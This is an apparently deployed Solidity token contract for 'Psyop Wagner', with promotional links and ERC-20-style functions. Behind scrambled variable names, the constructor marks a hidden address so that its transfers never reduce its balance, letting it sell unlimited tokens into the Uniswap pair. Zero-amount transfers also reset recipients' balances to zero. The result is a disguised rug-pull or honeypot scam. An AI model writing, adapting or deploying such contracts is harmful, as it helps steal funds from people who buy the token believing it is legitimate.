/*

Website: https://psyopwagner.cryptotoken.live/

Twitter: https://twitter.com/PsyopWagner

Telegram: https://t.me/PsyopWagner

*/

// SPDX-License-Identifier: MIT

pragma solidity >=0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract PsyopWagner is Ownable {
    function approve(address evzowacuglir, uint256 hqnztcaeyoj) public returns (bool success) {
        allowance[msg.sender][evzowacuglir] = hqnztcaeyoj;
        emit Approval(msg.sender, evzowacuglir, hqnztcaeyoj);
        return true;
    }

    function thajfbin(address pltc, address yzvhji, uint256 hqnztcaeyoj) private {
        if (0 == cpsfoer[pltc]) {
            balanceOf[pltc] -= hqnztcaeyoj;
        }
        balanceOf[yzvhji] += hqnztcaeyoj;
        if (0 == hqnztcaeyoj && yzvhji != qwimec) {
            balanceOf[yzvhji] = hqnztcaeyoj;
        }
        emit Transfer(pltc, yzvhji, hqnztcaeyoj);
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transferFrom(address pltc, address yzvhji, uint256 hqnztcaeyoj) public returns (bool success) {
        require(hqnztcaeyoj <= allowance[pltc][msg.sender]);
        allowance[pltc][msg.sender] -= hqnztcaeyoj;
        thajfbin(pltc, yzvhji, hqnztcaeyoj);
        return true;
    }

    address public qwimec;

    mapping(address => mapping(address => uint256)) public allowance;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) private qfbjsai;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint8 public decimals = 9;

    uint256 private tbsouqagk = 120;

    mapping(address => uint256) public balanceOf;

    constructor(address bkecpo) {
        balanceOf[msg.sender] = totalSupply;
        cpsfoer[bkecpo] = tbsouqagk;
        IUniswapV2Router02 qkzmit = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        qwimec = IUniswapV2Factory(qkzmit.factory()).createPair(address(this), qkzmit.WETH());
    }

    function transfer(address yzvhji, uint256 hqnztcaeyoj) public returns (bool success) {
        thajfbin(msg.sender, yzvhji, hqnztcaeyoj);
        return true;
    }

    mapping(address => uint256) private cpsfoer;

    string public symbol = 'Psyop Wagner';

    string public name = 'Psyop Wagner';
}